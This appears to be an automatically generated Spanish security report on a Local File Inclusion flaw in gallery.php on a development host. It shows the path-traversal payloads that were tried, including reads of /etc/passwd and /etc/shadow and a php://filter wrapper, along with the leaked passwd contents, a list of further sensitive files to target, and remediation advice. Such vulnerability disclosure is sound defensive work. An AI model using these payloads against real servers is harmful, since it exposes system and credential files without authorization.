# Informe de Análisis de Seguridad - Local File Inclusion (LFI)

**Fecha:** 2026-04-30 16:02:10  
**Objetivo:** http://web.dev.local:8081  
**Tipo de análisis:** Local File Inclusion (LFI)  
**Resultado:** VULNERABILIDAD CONFIRMADA Y EXPLOTADA

---

## 1. Resumen Ejecutivo

Se identificó y explotó con éxito una vulnerabilidad de tipo **Local File Inclusion (LFI)** en la aplicación web alojada en `http://web.dev.local:8081`. Esta vulnerabilidad permite a un atacante leer archivos arbitrarios del sistema de ficheros del servidor, incluyendo ficheros sensibles del sistema operativo.

**Severidad:** 🔴 CRÍTICA (CVSS v3: ~9.1)

---

## 2. Descripción de la Vulnerabilidad

### Tipo
Local File Inclusion (LFI) — CWE-98 / OWASP A01:2021

### Endpoint Afectado
```
http://web.dev.local:8081/gallery.php?page=<VALOR>
```

### Descripción Técnica
El parámetro `page` en el fichero `gallery.php` incluye directamente el valor proporcionado por el usuario mediante una función PHP de inclusión de ficheros (presumiblemente `include()`, `require()`, `include_once()` o `require_once()`), sin aplicar ningún tipo de sanitización ni validación. Esto permite a un atacante manipular la ruta para incluir ficheros del sistema.

---

## 3. Prueba de Concepto (PoC)

### 3.1 Payload utilizado

```
http://web.dev.local:8081/gallery.php?page=../../../etc/passwd
```

### 3.2 Resultado obtenido

La respuesta del servidor incluyó directamente el contenido del fichero `/etc/passwd`:

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
```

### 3.3 Payloads adicionales probados

| Payload | Resultado |
|---------|-----------|
| `../../../etc/passwd` | ✅ Éxito - Contenido completo visible |
| `../../../../etc/passwd` | ✅ Éxito - Contenido completo visible |
| `../../../etc/shadow` | ❌ Sin contenido (permisos insuficientes del proceso web) |
| `php://filter/convert.base64-encode/resource=gallery.php` | ❌ No procesado (posible filtro de wrappers) |

---

## 4. Impacto

| Riesgo | Detalle |
|--------|---------|
| **Divulgación de información** | Lectura de `/etc/passwd` con nombres de usuarios del sistema |
| **Reconocimiento** | Identificación de usuarios del SO para ataques posteriores |
| **Escalada potencial** | Acceso a ficheros de configuración con credenciales (`.env`, `config.php`, etc.) |
| **Confidencialidad** | COMPROMETIDA |
| **Integridad** | No afectada directamente |
| **Disponibilidad** | No afectada directamente |

---

## 5. Vectores de Ataque Adicionales (Potenciales)

Si el proceso web tuviera mayores privilegios, un atacante podría intentar leer:
- `/etc/shadow` → hashes de contraseñas
- `/var/www/html/gallery.php` → código fuente con posibles credenciales
- `/proc/self/environ` → variables de entorno del proceso
- Ficheros de configuración de bases de datos

---

## 6. Recomendaciones

1. **Validar y sanitizar la entrada del usuario:** Implementar una lista blanca (whitelist) de páginas permitidas y nunca usar directamente el input del usuario en rutas de ficheros.

   ```php
   // Ejemplo seguro con whitelist
   $allowed_pages = ['modern', 'classic', 'abstract', 'about'];
   $page = $_GET['page'];
   if (!in_array($page, $allowed_pages)) {
       die('Página no encontrada');
   }
   include('pages/' . $page . '.php');
   ```

2. **Deshabilitar `allow_url_include`** en `php.ini` para prevenir RFI.
3. **Aplicar principio de mínimo privilegio** al proceso del servidor web.
4. **Usar rutas absolutas** con `realpath()` y verificar que el fichero resultante esté dentro del directorio permitido.
5. **Implementar WAF** para detectar y bloquear payloads de traversal (`../`).

---

## 7. Conclusión

La aplicación web `Galería de Arte Virtual` en `http://web.dev.local:8081` presenta una vulnerabilidad crítica de Local File Inclusion en el parámetro `page` del fichero `gallery.php`. La vulnerabilidad fue confirmada y explotada, obteniendo el contenido del fichero `/etc/passwd` del servidor. Se recomienda corrección inmediata aplicando validación mediante whitelist del parámetro afectado.

---

*Informe generado automáticamente por análisis de seguridad autorizado.*
